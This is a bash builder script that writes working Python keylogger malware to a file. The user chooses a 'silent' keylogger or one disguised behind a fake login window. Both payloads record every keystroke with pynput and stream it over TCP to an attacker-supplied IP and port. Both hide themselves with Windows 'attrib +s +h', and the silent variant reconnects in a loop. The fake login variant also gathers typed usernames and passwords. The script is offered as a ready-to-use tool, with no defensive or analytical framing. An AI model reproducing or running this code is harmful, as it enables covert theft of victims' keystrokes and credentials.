#!/bin/bash

# ASCII Art
ascii_art() {
    cat << "EOF"

  _      ____   _____ _           __          ___       
 | |    / __ \ / ____| |          \ \        / (_)      
 | |   | |  | | |  __| | _____ _   \ \  /\  / / _ _ __  
 | |   | |  | | | |_ | |/ / _ \ | | \ \/  \/ / | | '_ \ 
 | |___| |__| | |__| |   <  __/ |_| |\  /\  /  | | | | |
 |______\____/ \_____|_|\_\___|\__, | \/  \/   |_|_| |_|
                                __/ |                   
                               |___/                    
                                                   
            Created by ZA0infinity
EOF
}

validate_ip() {
    local ip="$1"
    if [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        IFS='.' read -r -a octets <<< "$ip"
        for octet in "${octets[@]}"; do
            if (( octet < 0 || octet > 255 )); then
                return 1
            fi
        done
        return 0
    else
        return 1
    fi
}

validate_port() {
    local port="$1"
    if [[ "$port" =~ ^[0-9]+$ ]] && (( port >= 1 && port <= 65535 )); then
        return 0
    else
        return 1
    fi
}

check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        echo "This script must be run as root. Please use 'sudo' to execute the script."
        exit 1
    fi
}

ascii_art

check_root

echo "Select the type of application:"
echo "1. Silent Keylogger"
echo "2. Keylogger with Login Application"
read -p "Enter 1 or 2: " app_type

read -p "Enter the server IP address: " ip_address
read -p "Enter the port: " port
read -p "Enter the output file name (e.g., target.py): " output_file

if ! validate_ip "$ip_address"; then
    echo "Invalid IP address format."
    exit 1
fi

if ! validate_port "$port"; then
    echo "Invalid port number. Port must be between 1 and 65535."
    exit 1
fi

# Python code template for both applications
python_code_template() {
    cat <<EOF
import threading
import socket
import subprocess
import time
from pynput import keyboard

SERVER_IP = "$ip_address"
SERVER_PORT = $port
RETRY_INTERVAL = 5  # Time in seconds between connection attempts

def execute_attrib_command():
    try:
        subprocess.run(['attrib', '+s', '+h', '$output_file'], check=True)
        print("Attrib command executed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while executing attrib command: {e}")

def connect_to_server():
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_IP, SERVER_PORT))
            print("Successfully connected to the server.")
            return client_socket
        except (socket.error, ConnectionRefusedError) as e:
            print(f"Connection failed: {e}. Retrying in {RETRY_INTERVAL} seconds...")
            time.sleep(RETRY_INTERVAL)

def on_press(key):
    try:
        if key == keyboard.Key.space:
            client_socket.sendall(b" ")
        elif key == keyboard.Key.backspace:
            client_socket.sendall(b"[BACKSPACE]")
        elif key == keyboard.Key.enter:
            client_socket.sendall(b"\\n")
        else:
            try:
                client_socket.sendall(f"{key.char}".encode('utf-8'))
            except AttributeError:
                client_socket.sendall(f"[{key}]".encode('utf-8'))
    except (socket.error, ConnectionAbortedError) as e:
        print(f"Error while sending data: {e}")
        reconnect()

def on_release(key):
    if key == keyboard.Key.esc:
        client_socket.close()
        return False

def start_listeners():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener:
        key_listener.join()

def reconnect():
    global client_socket
    print("Attempting to reconnect...")
    client_socket.close()
    client_socket = connect_to_server()

# Execute the attrib command to hide the script
execute_attrib_command()

client_socket = connect_to_server()

listener_thread = threading.Thread(target=start_listeners, daemon=True)
listener_thread.start()
listener_thread.join()
EOF
}

case "$app_type" in
    1)
        python_code_template > "$output_file"
        ;;
    2)
        cat <<EOF > "$output_file"
import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import threading
import socket
import subprocess
import time

SERVER_IP = "$ip_address"
SERVER_PORT = $port
RETRY_INTERVAL = 5  # Time in seconds between connection attempts

def execute_attrib_command():
    try:
        subprocess.run(['attrib', '+s', '+h', '$output_file'], check=True)
        print("Attrib command executed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while executing attrib command: {e}")

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_IP, SERVER_PORT))

def on_press(key):
    if key == keyboard.Key.space:
        client_socket.sendall(b" ")
    elif key == keyboard.Key.backspace:
        client_socket.sendall(b"[BACKSPACE]")
    elif key == keyboard.Key.enter:
        client_socket.sendall(b"\\n")
    else:
        try:
            client_socket.sendall(f"{key.char}".encode('utf-8'))
        except AttributeError:
            client_socket.sendall(f"[{key}]".encode('utf-8'))

def on_release(key):
    if key == keyboard.Key.esc:
        client_socket.close()
        return False

def start_listeners():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener:
        key_listener.join()

def reconnect():
    global client_socket
    print("Attempting to reconnect...")
    client_socket.close()
    client_socket = connect_to_server()

def login():
    username = username_entry.get()
    password = password_entry.get()
    print(f"Username: {username}")
    print(f"Password: {password}")
    messagebox.showinfo("Login Information", f"Username: {username}\\nPassword: {password}")

root = tk.Tk()
root.title("Login Application")
root.geometry("1280x720")

frame = tk.Frame(root, bg="black")
frame.place(relwidth=1, relheight=1)

header_label = tk.Label(frame, text="Created by ZA0infinity", font=("Arial", 18, "bold"), bg="black", fg="white")
header_label.pack(pady=10)

title_label = tk.Label(frame, text="Login Application", font=("Arial", 24, "bold"), bg="red")
title_label.pack(pady=20)

input_frame = tk.Frame(frame, bg="red")
input_frame.pack(pady=20)

username_label = tk.Label(input_frame, text="Username:", font=("Arial", 14), bg="red")
username_label.grid(row=0, column=0, padx=10, pady=10, sticky="e")
username_entry = tk.Entry(input_frame, font=("Arial", 14))
username_entry.grid(row=0, column=1, padx=10, pady=10)

password_label = tk.Label(input_frame, text="Password:", font=("Arial", 14), bg="red")
password_label.grid(row=1, column=0, padx=10, pady=10, sticky="e")
password_entry = tk.Entry(input_frame, show='*', font=("Arial", 14))
password_entry.grid(row=1, column=1, padx=10, pady=10)

login_button = tk.Button(frame, text="Login", font=("Arial", 14, "bold"), command=login, bg="red", fg="white", relief="raised")
login_button.pack(pady=20)

listener_thread = threading.Thread(target=start_listeners, daemon=True)
listener_thread.start()

root.mainloop()
EOF
        ;;
    *)
        echo "Invalid option selected"
        exit 1
        ;;
esac

echo "Target file '$output_file' has been created with IP address $ip_address and port $port"
